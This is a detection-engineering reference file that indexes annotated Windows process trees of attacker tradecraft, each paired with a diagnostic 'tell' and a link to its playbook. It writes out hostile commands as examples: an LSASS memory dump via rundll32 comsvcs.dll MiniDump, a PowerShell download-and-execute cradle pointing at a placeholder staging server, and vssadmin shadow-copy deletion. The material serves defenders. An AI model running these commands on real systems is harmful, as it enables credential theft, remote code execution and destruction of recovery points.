# Process Tree Reference Library

Annotated process trees pulled from across this repo's playbooks, collected in one place for quick pattern-matching during live investigation. Each one links back to the playbook with full triage/validation detail — this file is a fast-reference index, not a replacement for reading the full playbook.

## Lateral movement (PsExec/WMI)
```
wmiprvse.exe (or services.exe)
  └── cmd.exe /c "whoami && net user"          ← recon after landing
        └── powershell.exe -enc <base64>       ← next-stage payload
```
**Tell:** `services.exe` or `wmiprvse.exe` spawning a shell is almost never legitimate on its own.
Full detail: `detections/playbooks/lateral-movement-psexec-wmi.md`

## Credential dumping (LSASS)
```
cmd.exe
  └── rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\out.dmp full
```
**Tell:** `rundll32.exe` invoking `comsvcs.dll,MiniDump` with a PID argument — this exact syntax has no legitimate everyday use case.
Full detail: `detections/playbooks/credential-dumping-lsass.md`

## PowerShell / LOLBin execution
```
powershell.exe -nop -w hidden -enc <base64>
  → decodes to: IEX (New-Object Net.WebClient).DownloadString('http://<staging-server>/payload.ps1')
  → payload.ps1 executes further recon or drops a second-stage binary
```
**Tell:** `-nop` + `-w hidden` together, combined with a download-and-execute (`IEX`/`DownloadString`) pattern in the decoded content.
Full detail: `detections/playbooks/powershell-lolbins.md`

## Phishing → execution (Office spawning a shell)
```
winword.exe (or excel.exe, outlook.exe)
  └── cmd.exe /c powershell.exe -enc <base64>      ← Office spawning a shell is almost never legitimate
        └── (continues into the PowerShell/LOLBin tree above)
```
**Tell:** any Office application process directly spawning `cmd.exe`, `powershell.exe`, or `mshta.exe` — the single highest-signal pattern in the phishing playbook.
Full detail: `detections/playbooks/phishing-initial-access.md`

## Ransomware precursor sequence
```
<initial access/lateral movement process>
  └── vssadmin.exe delete shadows /all /quiet          ← recovery point destruction
  └── net stop <backup service>                         ← disabling backup agents
  └── <ransomware binary> encrypting files at high rate  ← the encryption process itself
```
**Tell:** shadow copy deletion is a near-universal precursor across ransomware families — often the fastest available signal, ahead of the ransom note itself appearing.
Full detail: `detections/playbooks/ransomware-detection-response.md`

## Reconnaissance sequence (not a parent/child tree — a command sequence from one session)
```
whoami /all                       ← confirm current privilege level and group memberships
net user                          ← enumerate local accounts
net user /domain                  ← enumerate domain accounts
net group "Domain Admins" /domain ← identify high-value targets
ipconfig /all                     ← map the local network
nltest /domain_trusts             ← map trust relationships, plan lateral movement
systeminfo                        ← OS version, patch level
net view \\<hostname>              ← enumerate shares on a specific target
```
**Tell:** it's the sequence and speed, not any single command, that separates this from normal admin troubleshooting — see the full playbook's triage section for the velocity threshold reasoning.
Full detail: `detections/playbooks/recon-discovery.md`

## How to add to this file

When a new playbook introduces a process tree pattern worth quick-referencing, add it here in the same format: the tree itself, a one-line "tell" describing the single most diagnostic detail, and a pointer back to the full playbook.
